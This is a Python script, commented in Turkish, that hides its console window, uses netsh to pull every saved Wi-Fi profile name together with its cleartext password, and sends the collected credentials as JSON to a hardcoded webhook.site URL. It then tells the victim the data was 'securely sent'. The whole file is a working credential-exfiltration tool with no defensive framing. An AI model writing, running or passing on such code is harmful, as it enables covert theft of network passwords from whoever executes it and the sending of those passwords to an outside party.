import subprocess
import re
import json
import urllib.request
import urllib.error

# Komut çalıştırma ve Komut İstemi penceresini gizleme fonksiyonu
def run_command(command):
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    return subprocess.run(command, capture_output=True, text=True, startupinfo=startupinfo)

# Wi-Fi profillerini alma fonksiyonu
def get_wifi_profiles():
    # 'netsh wlan show profiles' komutu ile Wi-Fi profillerini al
    profiles_output = run_command(["netsh", "wlan", "show", "profiles"])
    profiles = [line.split(":")[1].strip() for line in profiles_output.stdout.splitlines() if "All User Profile" in line]
    
    # Wi-Fi profil adlarını ve şifrelerini saklamak için bir sözlük oluştur
    wifi_data = {}

    # Her Wi-Fi profili için adını ve şifresini çıkar
    for profile in profiles:
        profile_output = run_command(["netsh", "wlan", "show", "profile", "name=" + profile, "key=clear"])
        name_match = re.search(r"Name\s+:\s+(.+)", profile_output.stdout)
        key_match = re.search(r"Key Content\s+:\s+(.+)", profile_output.stdout)
        
        if name_match and key_match:
            profile_name = name_match.group(1)
            key_content = key_match.group(1)
            wifi_data[profile_name] = key_content
            
    return wifi_data

# Verileri webhook'a gönderme fonksiyonu
def send_to_webhook(data, webhook_url):
    # Başlıkları tanımla ve JSON verisini hazırla
    headers = {'Content-Type': 'application/json'}
    data = json.dumps(data).encode('utf-8')

    # JSON verisini bir HTTP isteği ile webhook'a gönder
    req = urllib.request.Request(webhook_url, data=data, headers=headers)
    
    try:
        with urllib.request.urlopen(req) as response:
            print("Wi-Fi profil adlarınız ve şifreleriniz güvenli bir şekilde gönderildi.")
    except urllib.error.URLError as e:
        print("İstek gönderilirken hata oluştu:", e)

if __name__ == "__main__":
    # Webhook URL'sini tanımla (kendi URL'nizle değiştirin)
    webhook_url = "https://webhook.site/ae6c8f3b-9d2e-48e7-bdab-9a1e4a38db94"
    
    # Wi-Fi profillerini al ve webhook'a gönder
    wifi_profiles = get_wifi_profiles()
    send_to_webhook(wifi_profiles, webhook_url)
